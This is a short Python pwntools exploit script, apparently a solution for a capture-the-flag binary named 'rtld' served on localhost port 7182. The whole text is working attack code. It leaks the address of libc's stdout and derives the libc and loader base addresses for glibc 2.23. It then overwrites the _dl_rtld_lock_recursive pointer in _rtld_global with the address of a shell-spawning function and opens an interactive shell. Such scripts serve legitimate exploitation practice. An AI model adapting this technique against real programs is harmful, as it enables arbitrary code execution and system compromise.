from pwn import *

p = remote('127.0.0.1', 7182)
e = ELF("./rtld", checksec=False)
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

p.recvuntil(b"stdout: ")
stdout = int(p.recvline()[:-1], 16)

print(hex(stdout))

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
ld_base = libc_base + 0x3ca000

rtld_global = ld_base + ld.symbols['_rtld_global']
dl_load_lock = rtld_global + 2312
dl_rtld_lock_recursive = rtld_global + 3848

get_shell = 0x555555400ad1

p.sendlineafter("addr: ", str(dl_rtld_lock_recursive))
p.sendlineafter("value: ", str(get_shell))

p.interactive()